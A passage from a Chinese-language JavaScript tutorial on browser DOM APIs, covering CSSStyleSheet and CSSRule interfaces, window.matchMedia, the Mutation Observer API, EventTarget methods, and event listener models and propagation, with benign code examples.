      sheet.cssRules[0].cssText
      // "body { background-color: red; margin: 20px; }"
   
      sheet.cssRules[1].cssText
      // "p { line-height: 1.4em; color: blue; }"

   每条 CSS 规则还有一个 ``style`` 属性，指向一个对象，用来读写具体的 CSS 命令。

   .. code:: javascript

      cssStyleSheet.cssRules[0].style.color = 'red';
      cssStyleSheet.cssRules[1].style.color = 'purple';

   **（9）CSSStyleSheet.ownerRule**

   有些样式表是通过 ``@import`` 规则输入的，它的 ``ownerRule`` 属性会返回一个 ``CSSRule`` 实例，代表那行 ``@import`` 规则。如果当前样式表不是通过 ``@import`` 引入的， ``ownerRule`` 属性返回 ``null`` 。

实例方法
~~~~~~~

   **（1）CSSStyleSheet.insertRule()**

    ``CSSStyleSheet.insertRule`` 方法用于在当前样式表的插入一个新的 CSS 规则。

   .. code:: javascript

      var sheet = document.querySelector('#styleElement').sheet;
      sheet.insertRule('#block { color: white }', 0);
      sheet.insertRule('p { color: red }', 1);

   该方法可以接受两个参数，第一个参数是表示 CSS 规则的字符串，这里只能有一条规则，否则会报错。第二个参数是该规则在样式表的插入位置（从0开始），该参数可选，默认为0（即默认插在样式表的头部）。注意，如果插入位置大于现有规则的数目，会报错。

   该方法的返回值是新插入规则的位置序号。

   注意，浏览器对脚本在样式表里面插入规则有很多[限制](https://drafts.csswg.org/cssom/#insert-a-css-rule)。所以，这个方法最好放在 ``try...catch`` 里使用。

   **（2）CSSStyleSheet.deleteRule()**

    ``CSSStyleSheet.deleteRule`` 方法用来在样式表里面移除一条规则，它的参数是该条规则在 ``cssRules`` 对象中的位置。该方法没有返回值。

   .. code:: javascript

      document.styleSheets[0].deleteRule(1);

实例：添加样式表
-------------

   网页添加样式表有两种方式。一种是添加一张内置样式表，即在文档中添加一个 ``<style>`` 节点。

   .. code:: javascript

      // 写法一
      var style = document.createElement('style');
      style.setAttribute('media', 'screen');
      style.innerHTML = 'body{color:red}';
      document.head.appendChild(style);
   
      // 写法二
      var style = (function () {
        var style = document.createElement('style');
        document.head.appendChild(style);
        return style;
      })();
      style.sheet.insertRule('.foo{color:red;}', 0);

   另一种是添加外部样式表，即在文档中添加一个 ``<link>`` 节点，然后将 ``href`` 属性指向外部样式表的 URL。

   .. code:: javascript

      var linkElm = document.createElement('link');
      linkElm.setAttribute('rel', 'stylesheet');
      linkElm.setAttribute('type', 'text/css');
      linkElm.setAttribute('href', 'reset-min.css');
   
      document.head.appendChild(linkElm);

CSSRuleList 接口
---------------

   CSSRuleList 接口是一个类似数组的对象，表示一组 CSS 规则，成员都是 CSSRule 实例。

   获取 CSSRuleList 实例，一般是通过 ``StyleSheet.cssRules`` 属性。

   .. code:: javascript

      // HTML 代码如下
      // <style id="myStyle">
      //   h1 { color: red; }
      //   p { color: blue; }
      // </style>
      var myStyleSheet = document.getElementById('myStyle').sheet;
      var crl = myStyleSheet.cssRules;
      crl instanceof CSSRuleList // true

   CSSRuleList 实例里面，每一条规则（CSSRule 实例）可以通过 ``rules.item(index)`` 或者 ``rules[index]`` 拿到。CSS 规则的条数通过 ``rules.length`` 拿到。还是用上面的例子。

   .. code:: javascript

      crl[0] instanceof CSSRule // true
      crl.length // 2

   注意，添加规则和删除规则不能在 CSSRuleList 实例操作，而要在它的父元素 StyleSheet 实例上，通过 ``StyleSheet.insertRule()`` 和 ``StyleSheet.deleteRule()`` 操作。

CSSRule 接口
-----------


概述
~~~

   一条 CSS 规则包括两个部分：CSS 选择器和样式声明。下面就是一条典型的 CSS 规则。

   .. code:: css

      .myClass {
        color: red;
        background-color: yellow;
      }

   JavaScript 通过 CSSRule 接口操作 CSS 规则。一般通过 CSSRuleList 接口（ ``StyleSheet.cssRules`` ）获取 CSSRule 实例。

   .. code:: javascript

      // HTML 代码如下
      // <style id="myStyle">
      //   .myClass {
      //     color: red;
      //     background-color: yellow;
      //   }
      // </style>
      var myStyleSheet = document.getElementById('myStyle').sheet;
      var ruleList = myStyleSheet.cssRules;
      var rule = ruleList[0];
      rule instanceof CSSRule // true

CSSRule 实例的属性
~~~~~~~~~~~~~~~~

   **（1）CSSRule.cssText**

    ``CSSRule.cssText`` 属性返回当前规则的文本，还是使用上面的例子。

   .. code:: javascript

      rule.cssText
      // ".myClass { color: red; background-color: yellow; }"

   如果规则是加载（ ``@import`` ）其他样式表， ``cssText`` 属性返回 ``@import 'url'`` 。

   **（2）CSSRule.parentStyleSheet**

    ``CSSRule.parentStyleSheet`` 属性返回当前规则所在的样式表对象（StyleSheet 实例），还是使用上面的例子。

   .. code:: javascript

      rule.parentStyleSheet === myStyleSheet // true

   **（3）CSSRule.parentRule**

    ``CSSRule.parentRule`` 属性返回包含当前规则的父规则，如果不存在父规则（即当前规则是顶层规则），则返回 ``null`` 。

   父规则最常见的情况是，当前规则包含在 ``@media`` 规则代码块之中。

   .. code:: javascript

      // HTML 代码如下
      // <style id="myStyle">
      //   @supports (display: flex) {
      //     @media screen and (min-width: 900px) {
      //       article {
      //         display: flex;
      //       }
      //     }
      //  }
      // </style>
      var myStyleSheet = document.getElementById('myStyle').sheet;
      var ruleList = myStyleSheet.cssRules;
   
      var rule0 = ruleList[0];
      rule0.cssText
      // "@supports (display: flex) {
      //    @media screen and (min-width: 900px) {
      //      article { display: flex; }
      //    }
      // }"
   
      // 由于这条规则内嵌其他规则，
      // 所以它有 cssRules 属性，且该属性是 CSSRuleList 实例
      rule0.cssRules instanceof CSSRuleList // true
   
      var rule1 = rule0.cssRules[0];
      rule1.cssText
      // "@media screen and (min-width: 900px) {
      //   article { display: flex; }
      // }"
   
      var rule2 = rule1.cssRules[0];
      rule2.cssText
      // "article { display: flex; }"
   
      rule1.parentRule === rule0 // true
      rule2.parentRule === rule1 // true

   **（4）CSSRule.type**

    ``CSSRule.type`` 属性返回一个整数值，表示当前规则的类型。

   最常见的类型有以下几种。

   - 1：普通样式规则（CSSStyleRule 实例）
   - 3： ``@import`` 规则
   - 4： ``@media`` 规则（CSSMediaRule 实例）
   - 5： ``@font-face`` 规则

CSSStyleRule 接口
~~~~~~~~~~~~~~~~

   如果一条 CSS 规则是普通的样式规则（不含特殊的 CSS 命令），那么除了 CSSRule 接口，它还部署了 CSSStyleRule 接口。

   CSSStyleRule 接口有以下两个属性。

   **（1）CSSStyleRule.selectorText**

    ``CSSStyleRule.selectorText`` 属性返回当前规则的选择器。

   .. code:: javascript

      var stylesheet = document.styleSheets[0];
      stylesheet.cssRules[0].selectorText // ".myClass"

   注意，这个属性是可写的。

   **（2）CSSStyleRule.style**

    ``CSSStyleRule.style`` 属性返回一个对象（CSSStyleDeclaration 实例），代表当前规则的样式声明，也就是选择器后面的大括号里面的部分。

   .. code:: javascript

      // HTML 代码为
      // <style id="myStyle">
      //   p { color: red; }
      // </style>
      var styleSheet = document.getElementById('myStyle').sheet;
      styleSheet.cssRules[0].style instanceof CSSStyleDeclaration
      // true

   CSSStyleDeclaration 实例的 ``cssText`` 属性，可以返回所有样式声明，格式为字符串。

   .. code:: javascript

      styleSheet.cssRules[0].style.cssText
      // "color: red;"
      styleSheet.cssRules[0].selectorText
      // "p"

CSSMediaRule 接口
~~~~~~~~~~~~~~~~

   如果一条 CSS 规则是 ``@media`` 代码块，那么它除了 CSSRule 接口，还部署了 CSSMediaRule 接口。

   该接口主要提供 ``media`` 属性和 ``conditionText`` 属性。前者返回代表 ``@media`` 规则的一个对象（MediaList 实例），后者返回 ``@media`` 规则的生效条件。

   .. code:: javascript

      // HTML 代码如下
      // <style id="myStyle">
      //   @media screen and (min-width: 900px) {
      //     article { display: flex; }
      //   }
      // </style>
      var styleSheet = document.getElementById('myStyle').sheet;
      styleSheet.cssRules[0] instanceof CSSMediaRule
      // true
   
      styleSheet.cssRules[0].media
      //  {
      //    0: "screen and (min-width: 900px)",
      //    appendMedium: function,
      //    deleteMedium: function,
      //    item: function,
      //    length: 1,
      //    mediaText: "screen and (min-width: 900px)"
      // }
   
      styleSheet.cssRules[0].conditionText
      // "screen and (min-width: 900px)"

window.matchMedia()
--------------------


基本用法
~~~~~~~

    ``window.matchMedia()`` 方法用来将 CSS 的[ ``Media Query`` ](https://developer.mozilla.org/en-US/docs/DOM/Using_media_queries_from_code)条件语句，转换成一个 MediaQueryList 实例。

   .. code:: javascript

      var mdl = window.matchMedia('(min-width: 400px)');
      mdl instanceof MediaQueryList // true

   上面代码中，变量 ``mdl`` 就是 mediaQueryList 的实例。

   注意，如果参数不是有效的 ``MediaQuery`` 条件语句， ``window.matchMedia`` 不会报错，依然返回一个 MediaQueryList 实例。

   .. code:: javascript

      window.matchMedia('bad string') instanceof MediaQueryList // true

MediaQueryList 接口的实例属性
~~~~~~~~~~~~~~~~~~~~~~~~~~~

   MediaQueryList 实例有三个属性。

   **（1）MediaQueryList.media**

    ``MediaQueryList.media`` 属性返回一个字符串，表示对应的 MediaQuery 条件语句。

   .. code:: javascript

      var mql = window.matchMedia('(min-width: 400px)');
      mql.media // "(min-width: 400px)"

   **（2）MediaQueryList.matches**

    ``MediaQueryList.matches`` 属性返回一个布尔值，表示当前页面是否符合指定的 MediaQuery 条件语句。

   .. code:: javascript

      if (window.matchMedia('(min-width: 400px)').matches) {
        /* 当前视口不小于 400 像素 */
      } else {
        /* 当前视口小于 400 像素 */
      }

   下面的例子根据 ``mediaQuery`` 是否匹配当前环境，加载相应的 CSS 样式表。

   .. code:: javascript

      var result = window.matchMedia("(max-width: 700px)");
   
      if (result.matches){
        var linkElm = document.createElement('link');
        linkElm.setAttribute('rel', 'stylesheet');
        linkElm.setAttribute('type', 'text/css');
        linkElm.setAttribute('href', 'small.css');
   
        document.head.appendChild(linkElm);
      }

   **（3）MediaQueryList.onchange**

   如果 MediaQuery 条件语句的适配环境发生变化，会触发 ``change`` 事件。 ``MediaQueryList.onchange`` 属性用来指定 ``change`` 事件的监听函数。该函数的参数是 ``change`` 事件对象（MediaQueryListEvent 实例），该对象与 MediaQueryList 实例类似，也有 ``media`` 和 ``matches`` 属性。

   .. code:: javascript

      var mql = window.matchMedia('(max-width: 600px)');
   
      mql.onchange = function(e) {
        if (e.matches) {
          /* 视口不超过 600 像素 */
        } else {
          /* 视口超过 600 像素 */
        }
      }

   上面代码中， ``change`` 事件发生后，存在两种可能。一种是显示宽度从600像素以上变为以下，另一种是从600像素以下变为以上，所以在监听函数内部要判断一下当前是哪一种情况。

MediaQueryList 接口的实例方法
~~~~~~~~~~~~~~~~~~~~~~~~~~~

   MediaQueryList 实例有两个方法 ``MediaQueryList.addListener()`` 和 ``MediaQueryList.removeListener()`` ，用来为 ``change`` 事件添加或撤销监听函数。

   .. code:: javascript

      var mql = window.matchMedia('(max-width: 600px)');
   
      // 指定监听函数
      mql.addListener(mqCallback);
   
      // 撤销监听函数
      mql.removeListener(mqCallback);
   
      function mqCallback(e) {
        if (e.matches) {
          /* 视口不超过 600 像素 */
        } else {
          /* 视口超过 600 像素 */
        }
      }

   注意， ``MediaQueryList.removeListener()`` 方法不能撤销 ``MediaQueryList.onchange`` 属性指定的监听函数。

/🟠 Mutation Observer API
==========================


概述
---

   Mutation Observer API 用来监视 DOM 变动。DOM 的任何变动，比如节点的增减、属性的变动、文本内容的变动，这个 API 都可以得到通知。

   概念上，它很接近事件，可以理解为 DOM 发生变动就会触发 Mutation Observer 事件。但是，它与事件有一个本质不同：事件是同步触发，也就是说，DOM 的变动立刻会触发相应的事件；Mutation Observer 则是异步触发，DOM 的变动并不会马上触发，而是要等到当前所有 DOM 操作都结束才触发。

   这样设计是为了应付 DOM 变动频繁的特点。举例来说，如果文档中连续插入1000个 ``<p>`` 元素，就会连续触发1000个插入事件，执行每个事件的回调函数，这很可能造成浏览器的卡顿；而 Mutation Observer 完全不同，只在1000个段落都插入结束后才会触发，而且只触发一次。

   Mutation Observer 有以下特点。

   - 它等待所有脚本任务完成后，才会运行（即异步触发方式）。
   - 它把 DOM 变动记录封装成一个数组进行处理，而不是一条条个别处理 DOM 变动。
   - 它既可以观察 DOM 的所有类型变动，也可以指定只观察某一类变动。

MutationObserver 构造函数
------------------------

   使用时，首先使用 ``MutationObserver`` 构造函数，新建一个观察器实例，同时指定这个实例的回调函数。

   .. code:: javascript

      var observer = new MutationObserver(callback);

   上面代码中的回调函数，会在每次 DOM 变动后调用。该回调函数接受两个参数，第一个是变动数组，第二个是观察器实例，下面是一个例子。

   .. code:: javascript

      var observer = new MutationObserver(function (mutations, observer) {
        mutations.forEach(function(mutation) {
          console.log(mutation);
        });
      });

MutationObserver 的实例方法
-------------------------


observe()
~~~~~~~~~~

    ``observe()`` 方法用来启动监听，它接受两个参数。

   - 第一个参数：所要观察的 DOM 节点
   - 第二个参数：一个配置对象，指定所要观察的特定变动

   .. code:: javascript

      var article = document.querySelector('article');
   
      var options = {
        'childList': true,
        'attributes':true
      } ;
   
      observer.observe(article, options);

   上面代码中， ``observe()`` 方法接受两个参数，第一个是所要观察的DOM元素是 ``article`` ，第二个是所要观察的变动类型（子节点变动和属性变动）。

   观察器所能观察的 DOM 变动类型（即上面代码的 ``options`` 对象），有以下几种。

   - **childList**：子节点的变动（指新增，删除或者更改）。
   - **attributes**：属性的变动。
   - **characterData**：节点内容或节点文本的变动。

   想要观察哪一种变动类型，就在 ``option`` 对象中指定它的值为 ``true`` 。需要注意的是，至少必须同时指定这三种观察的一种，若均未指定将报错。

   除了变动类型， ``options`` 对象还可以设定以下属性：

   -  ``subtree`` ：布尔值，表示是否将该观察器应用于该节点的所有后代节点。
   -  ``attributeOldValue`` ：布尔值，表示观察 ``attributes`` 变动时，是否需要记录变动前的属性值。
   -  ``characterDataOldValue`` ：布尔值，表示观察 ``characterData`` 变动时，是否需要记录变动前的值。
   -  ``attributeFilter`` ：数组，表示需要观察的特定属性（比如 ``['class','src']`` ）。

   .. code:: javascript

      // 开始监听文档根节点（即<html>标签）的变动
      mutationObserver.observe(document.documentElement, {
        attributes: true,
        characterData: true,
        childList: true,
        subtree: true,
        attributeOldValue: true,
        characterDataOldValue: true
      });

   对一个节点添加观察器，就像使用 ``addEventListener()`` 方法一样，多次添加同一个观察器是无效的，回调函数依然只会触发一次。如果指定不同的 ``options`` 对象，以后面添加的那个为准，类似覆盖。

   下面的例子是观察新增的子节点。

   .. code:: javascript

      var insertedNodes = [];
      var observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
          for (var i = 0; i < mutation.addedNodes.length; i++) {
            insertedNodes.push(mutation.addedNodes[i]);
          }
        });
        console.log(insertedNodes);
      });
      observer.observe(document, { childList: true, subtree: true });

disconnect()，takeRecords()
~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``disconnect()`` 方法用来停止观察。调用该方法后，DOM 再发生变动，也不会触发观察器。

   .. code:: javascript

      observer.disconnect();

    ``takeRecords()`` 方法用来清除变动记录，即不再处理未处理的变动。该方法返回变动记录的数组。

   .. code:: javascript

      observer.takeRecords();

   下面是一个例子。

   .. code:: javascript

      // 保存所有没有被观察器处理的变动
      var changes = mutationObserver.takeRecords();
   
      // 停止观察
      mutationObserver.disconnect();

MutationRecord 对象
-------------------

   DOM 每次发生变化，就会生成一条变动记录（MutationRecord 实例）。该实例包含了与变动相关的所有信息。Mutation Observer 处理的就是一个个 ``MutationRecord`` 实例所组成的数组。

    ``MutationRecord`` 对象包含了DOM的相关信息，有如下属性：

   -  ``type`` ：观察的变动类型（ ``attributes`` 、 ``characterData`` 或者 ``childList`` ）。
   -  ``target`` ：发生变动的DOM节点。
   -  ``addedNodes`` ：新增的DOM节点。
   -  ``removedNodes`` ：删除的DOM节点。
   -  ``previousSibling`` ：前一个同级节点，如果没有则返回 ``null`` 。
   -  ``nextSibling`` ：下一个同级节点，如果没有则返回 ``null`` 。
   -  ``attributeName`` ：发生变动的属性。如果设置了 ``attributeFilter`` ，则只返回预先指定的属性。
   -  ``oldValue`` ：变动前的值。这个属性只对 ``attribute`` 和 ``characterData`` 变动有效，如果发生 ``childList`` 变动，则返回 ``null`` 。

应用示例
-------


子元素的变动
~~~~~~~~~~

   下面的例子说明如何读取变动记录。

   .. code:: javascript

      var callback = function (records){
        records.map(function(record){
          console.log('Mutation type: ' + record.type);
          console.log('Mutation target: ' + record.target);
        });
      };
   
      var mo = new MutationObserver(callback);
   
      var option = {
        'childList': true,
        'subtree': true
      };
   
      mo.observe(document.body, option);

   上面代码的观察器，观察 ``<body>`` 的所有下级节点（ ``childList`` 表示观察子节点， ``subtree`` 表示观察后代节点）的变动。回调函数会在控制台显示所有变动的类型和目标节点。

属性的变动
~~~~~~~~

   下面的例子说明如何追踪属性的变动。

   .. code:: javascript

      var callback = function (records) {
        records.map(function (record) {
          console.log('Previous attribute value: ' + record.oldValue);
        });
      };
   
      var mo = new MutationObserver(callback);
   
      var element = document.getElementById('#my_element');
   
      var options = {
        'attributes': true,
        'attributeOldValue': true
      }
   
      mo.observe(element, options);

   上面代码先设定追踪属性变动（ ``'attributes': true`` ），然后设定记录变动前的值。实际发生变动时，会将变动前的值显示在控制台。

取代 DOMContentLoaded 事件
~~~~~~~~~~~~~~~~~~~~~~~~~

   网页加载的时候，DOM 节点的生成会产生变动记录，因此只要观察 DOM 的变动，就能在第一时间触发相关事件，也就没有必要使用 ``DOMContentLoaded`` 事件。

   .. code:: javascript

      var observer = new MutationObserver(callback);
      observer.observe(document.documentElement, {
        childList: true,
        subtree: true
      });

   上面代码中，监听 ``document.documentElement`` （即网页的 ``<html>`` HTML 节点）的子节点的变动， ``subtree`` 属性指定监听还包括后代节点。因此，任意一个网页元素一旦生成，就能立刻被监听到。

   下面的代码，使用 ``MutationObserver`` 对象封装一个监听 DOM 生成的函数。

   .. code:: javascript

      (function(win){
        'use strict';
   
        var listeners = [];
        var doc = win.document;
        var MutationObserver = win.MutationObserver || win.WebKitMutationObserver;
        var observer;
   
        function ready(selector, fn){
          // 储存选择器和回调函数
          listeners.push({
            selector: selector,
            fn: fn
          });
          if(!observer){
            // 监听document变化
            observer = new MutationObserver(check);
            observer.observe(doc.documentElement, {
              childList: true,
              subtree: true
            });
          }
          // 检查该节点是否已经在DOM中
          check();
        }
   
        function check(){
        // 检查是否匹配已储存的节点
          for(var i = 0; i < listeners.length; i++){
            var listener = listeners[i];
            // 检查指定节点是否有匹配
            var elements = doc.querySelectorAll(listener.selector);
            for(var j = 0; j < elements.length; j++){
              var element = elements[j];
              // 确保回调函数只会对该元素调用一次
              if(!element.ready){
                element.ready = true;
                // 对该节点调用回调函数
                listener.fn.call(element, element);
              }
            }
          }
        }
   
        // 对外暴露ready
        win.ready = ready;
   
      })(this);
   
      // 使用方法
      ready('.foo', function(element){
        // ...
      });

参考链接
-------

   - Paul Kinlan, [Detect DOM changes with Mutation Observers](https://developers.google.com/web/updates/2012/02/Detect-DOM-changes-with-Mutation-Observers)
   - Tiffany Brown, [Getting to know mutation observers](http://dev.opera.com/articles/view/mutation-observers-tutorial/)
   - Michal Budzynski, [JavaScript: The less known parts. DOM Mutations](http://michalbe.blogspot.com/2013/04/javascript-less-known-parts-dom.html)
   - Jeff Griffiths, [DOM MutationObserver – reacting to DOM changes without killing browser performance](https://hacks.mozilla.org/2012/05/dom-mutationobserver-reacting-to-dom-changes-without-killing-browser-performance/)
   - Addy Osmani, [Detect, Undo And Redo DOM Changes With Mutation Observers](http://addyosmani.com/blog/mutation-observers/)
   - Ryan Morr, [Using Mutation Observers to Watch for Element Availability](http://ryanmorr.com/using-mutation-observers-to-watch-for-element-availability/)


/🟡9. 事件
================================================================================

/🟠 EventTarget 接口
====================

   事件的本质是程序各个组成部分之间的一种通信方式，也是异步编程的一种实现。DOM 支持大量的事件，本章开始介绍 DOM 的事件编程。

   介绍具体的事件之前，先来看看如何让 DOM 节点监听事件。

概述
---

   DOM 节点的事件操作（监听和触发），都定义在 ``EventTarget`` 接口。所有节点对象都部署了这个接口，其他一些需要事件通信的浏览器内置对象（比如， ``XMLHttpRequest`` 、 ``AudioNode`` 、 ``AudioContext`` ）也部署了这个接口。

   该接口主要提供三个实例方法。

   -  ``addEventListener()`` ：绑定事件的监听函数
   -  ``removeEventListener()`` ：移除事件的监听函数
   -  ``dispatchEvent()`` ：触发事件

EventTarget.addEventListener()
-------------------------------

    ``EventTarget.addEventListener()`` 用于在当前节点或对象上（即部署了 EventTarget 接口的对象），定义一个特定事件的监听函数。一旦这个事件发生，就会执行监听函数。该方法没有返回值。

   .. code:: javascript

      target.addEventListener(type, listener[, useCapture]);

   该方法接受三个参数。

   -  ``type`` ：事件名称，大小写敏感。
   -  ``listener`` ：监听函数。事件发生时，会调用该监听函数。
   -  ``useCapture`` ：布尔值，如果设为 ``true`` ，表示监听函数将在捕获阶段（capture）触发（参见后文《事件的传播》部分）。该参数可选，默认值为 ``false`` （监听函数只在冒泡阶段被触发）。

   下面是一个例子。

   .. code:: javascript

      function hello() {
        console.log('Hello world');
      }
   
      var button = document.getElementById('btn');
      button.addEventListener('click', hello, false);

   上面代码中， ``button`` 节点的 ``addEventListener()`` 方法绑定 ``click`` 事件的监听函数 ``hello()`` ，该函数只在冒泡阶段触发。

   关于参数，有两个地方需要注意。

   首先，第二个参数除了监听函数，还可以是一个具有 ``handleEvent`` 方法的对象，效果与监听函数一样。

   .. code:: javascript

      buttonElement.addEventListener('click', {
        handleEvent: function (event) {
          console.log('click');
        }
      });

   上面代码中， ``addEventListener()`` 方法的第二个参数，就是一个具有 ``handleEvent()`` 方法的对象。

   其次，第三个参数除了布尔值 ``useCapture`` ，还可以是一个监听器配置对象，定制事件监听行为。该对象有以下属性。

   > -  ``capture`` ：布尔值，如果设为 ``true`` ，表示监听函数在捕获阶段触发，默认为 ``false`` ，在冒泡阶段触发。
   > -  ``once`` ：布尔值，如果设为 ``true`` ，表示监听函数执行一次就会自动移除，后面将不再监听该事件。该属性默认值为 ``false`` 。
   > -  ``passive`` ：布尔值，设为 ``true`` 时，表示禁止监听函数调用 ``preventDefault()`` 方法。如果调用了，浏览器将忽略这个要求，并在控制台输出一条警告。该属性默认值为 ``false`` 。
   > -  ``signal`` ：该属性的值为一个 AbortSignal 对象，为监听器设置了一个信号通道，用来在需要时发出信号，移除监听函数。

   下面是 ``once`` 属性的例子，让监听函数只执行一次。

   .. code:: javascript

      element.addEventListener('click', function (event) {
        // 只执行一次的代码
      }, {once: true});

    ``addEventListener()`` 方法可以为针对当前对象的同一个事件，添加多个不同的监听函数。这些函数按照添加顺序触发，即先添加先触发。如果为同一个事件多次添加同一个监听函数，该函数只会执行一次，多余的添加将自动被去除（不必使用 ``removeEventListener()`` 方法手动去除）。

   .. code:: javascript

      function hello() {
        console.log('Hello world');
      }
   
      document.addEventListener('click', hello, false);
      document.addEventListener('click', hello, false);

   执行上面代码，点击文档只会输出一行 ``Hello world`` 。

   如果希望向监听函数传递参数，可以用匿名函数包装一下监听函数。

   .. code:: javascript

      function print(x) {
        console.log(x);
      }
   
      var el = document.getElementById('div1');
      el.addEventListener('click', function () { print('Hello'); }, false);

   上面代码通过匿名函数，向监听函数 ``print`` 传递了一个参数。

   监听函数内部的 ``this`` ，指向当前事件所在的那个对象。

   .. code:: javascript

      // HTML 代码如下
      // <p id="para">Hello</p>
      var para = document.getElementById('para');
      para.addEventListener('click', function (e) {
        console.log(this.nodeName); // "P"
      }, false);

   上面代码中，监听函数内部的 ``this`` 指向事件所在的对象 ``para`` 。

EventTarget.removeEventListener()
----------------------------------

    ``EventTarget.removeEventListener()`` 方法用来移除 ``addEventListener()`` 方法添加的事件监听函数。该方法没有返回值。

   .. code:: javascript

      div.addEventListener('click', listener, false);
      div.removeEventListener('click', listener, false);

    ``removeEventListener()`` 方法的参数，与 ``addEventListener()`` 方法完全一致。它的第一个参数“事件类型”，大小写敏感。

   注意， ``removeEventListener()`` 方法移除的监听函数，必须是 ``addEventListener()`` 方法添加的那个监听函数，而且必须在同一个元素节点，否则无效。

   .. code:: javascript

      div.addEventListener('click', function (e) {}, false);
      div.removeEventListener('click', function (e) {}, false);

   上面代码中， ``removeEventListener()`` 方法无效，因为监听函数不是同一个匿名函数。

   .. code:: javascript

      element.addEventListener('mousedown', handleMouseDown, true);
      element.removeEventListener("mousedown", handleMouseDown, false);

   上面代码中， ``removeEventListener()`` 方法也是无效的，因为第三个参数不一样。

EventTarget.dispatchEvent()
----------------------------

    ``EventTarget.dispatchEvent()`` 方法在当前节点上触发指定事件，从而触发监听函数的执行。该方法返回一个布尔值，只要有一个监听函数调用了 ``Event.preventDefault()`` ，则返回值为 ``false`` ，否则为 ``true`` 。

   .. code:: javascript

      target.dispatchEvent(event)

    ``dispatchEvent()`` 方法的参数是一个 ``Event`` 对象的实例（详见《Event 对象》章节）。

   .. code:: javascript

      para.addEventListener('click', hello, false);
      var event = new Event('click');
      para.dispatchEvent(event);

   上面代码在当前节点触发了 ``click`` 事件。

   如果 ``dispatchEvent()`` 方法的参数为空，或者不是一个有效的事件对象，将报错。

   下面代码根据 ``dispatchEvent()`` 方法的返回值，判断事件是否被取消了。

   .. code:: javascript

      var canceled = !cb.dispatchEvent(event);
      if (canceled) {
        console.log('事件取消');
      } else {
        console.log('事件未取消');
      }

/🟠 事件模型
===========


监听函数
-------

   浏览器的事件模型，就是通过监听函数（listener）对事件做出反应。事件发生后，浏览器监听到了这个事件，就会执行对应的监听函数。这是事件驱动编程模式（event-driven）的主要编程方式。

   JavaScript 有三种方法，可以为事件绑定监听函数。

HTML 的 on- 属性
~~~~~~~~~~~~~~~

   HTML 语言允许在元素的属性中，直接定义某些事件的监听代码。

   .. code:: html

      <body onload="doSomething()">
      <div onclick="console.log('触发事件')">

   上面代码为 ``body`` 节点的 ``load`` 事件、 ``div`` 节点的 ``click`` 事件，指定了监听代码。一旦事件发生，就会执行这段代码。

   元素的事件监听属性，都是 ``on`` 加上事件名，比如 ``onload`` 就是 ``on + load`` ，表示 ``load`` 事件的监听代码。

   注意，这些属性的值是将会执行的代码，而不是一个函数。

   .. code:: html

      <!-- 正确 -->
      <body onload="doSomething()">
   
      <!-- 错误 -->
      <body onload="doSomething">

   一旦指定的事件发生， ``on-`` 属性的值是原样传入 JavaScript 引擎执行。因此如果要执行函数，不要忘记加上一对圆括号。

   使用这个方法指定的监听代码，只会在冒泡阶段触发。

   .. code:: html

      <div onclick="console.log(2)">
        <button onclick="console.log(1)">点击</button>
      </div>

   上面代码中， ``<button>`` 是 ``<div>`` 的子元素。 ``<button>`` 的 ``click`` 事件，也会触发 ``<div>`` 的 ``click`` 事件。由于 ``on-`` 属性的监听代码，只在冒泡阶段触发，所以点击结果是先输出 ``1`` ，再输出 ``2`` ，即事件从子元素开始冒泡到父元素。

   直接设置 ``on-`` 属性，与通过元素节点的 ``setAttribute`` 方法设置 ``on-`` 属性，效果是一样的。

   .. code:: javascript

      el.setAttribute('onclick', 'doSomething()');
      // 等同于
      // <Element onclick="doSomething()">

元素节点的事件属性
~~~~~~~~~~~~~~~

   元素节点对象的事件属性，同样可以指定监听函数。

   .. code:: javascript

      window.onload = doSomething;
   
      div.onclick = function (event) {
        console.log('触发事件');
      };

   使用这个方法指定的监听函数，也是只会在冒泡阶段触发。

   注意，这种方法与 HTML 的 ``on-`` 属性的差异是，它的值是函数名（ ``doSomething`` ），而不像后者，必须给出完整的监听代码（ ``doSomething()`` ）。

EventTarget.addEventListener()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

   所有 DOM 节点实例都有 ``addEventListener`` 方法，用来为该节点定义事件的监听函数。

   .. code:: javascript

      window.addEventListener('load', doSomething, false);

    ``addEventListener`` 方法的详细介绍，参见 ``EventTarget`` 章节。

小结
~~~

   上面三种方法，第一种“HTML 的 on- 属性”，违反了 HTML 与 JavaScript 代码相分离的原则，将两者写在一起，不利于代码分工，因此不推荐使用。

   第二种“元素节点的事件属性”的缺点在于，同一个事件只能定义一个监听函数，也就是说，如果定义两次 ``onclick`` 属性，后一次定义会覆盖前一次。因此，也不推荐使用。

   第三种 ``EventTarget.addEventListener`` 是推荐的指定监听函数的方法。它有如下优点：

   - 同一个事件可以添加多个监听函数。
   - 能够指定在哪个阶段（捕获阶段还是冒泡阶段）触发监听函数。
   - 除了 DOM 节点，其他对象（比如 ``window`` 、 ``XMLHttpRequest`` 等）也有这个接口，它等于是整个 JavaScript 统一的监听函数接口。

this 的指向
----------

   监听函数内部的 ``this`` 指向触发事件的那个元素节点。

   .. code:: html

      <button id="btn" onclick="console.log(this.id)">点击</button>

   执行上面代码，点击后会输出 ``btn`` 。

   其他两种监听函数的写法， ``this`` 的指向也是如此。

   .. code:: javascript

      // HTML 代码如下
      // <button id="btn">点击</button>
      var btn = document.getElementById('btn');
   
      // 写法一
      btn.onclick = function () {
        console.log(this.id);
      };
   
      // 写法二
      btn.addEventListener(
        'click',
        function (e) {
          console.log(this.id);
        },
        false
      );

   上面两种写法，点击按钮以后也是输出 ``btn`` 。

事件的传播
--------

   一个事件发生后，会在子元素和父元素之间传播（propagation）。这种传播分成三个阶段。

   - **第一阶段**：从 ``window`` 对象传导到目标节点（上层传到底层），称为“捕获阶段”（capture phase）。
   - **第二阶段**：在目标节点上触发，称为“目标阶段”（target phase）。
   - **第三阶段**：从目标节点传导回 ``window`` 对象（从底层传回上层），称为“冒泡阶段”（bubbling phase）。

   这种三阶段的传播模型，使得同一个事件会在多个节点上触发。

   .. code:: html

      <div>
        <p>点击</p>
      </div>

   上面代码中， ``<div>`` 节点之中有一个 ``<p>`` 节点。

   如果对这两个节点，都设置 ``click`` 事件的监听函数（每个节点的捕获阶段和冒泡阶段，各设置一个监听函数），共计设置四个监听函数。然后，对 ``<p>`` 点击， ``click`` 事件会触发四次。

   .. code:: javascript

      var phases = {
        1: 'capture',
        2: 'target',
        3: 'bubble'
      };
   
      var div = document.querySelector('div');
      var p = document.querySelector('p');
   
      div.addEventListener('click', callback, true);
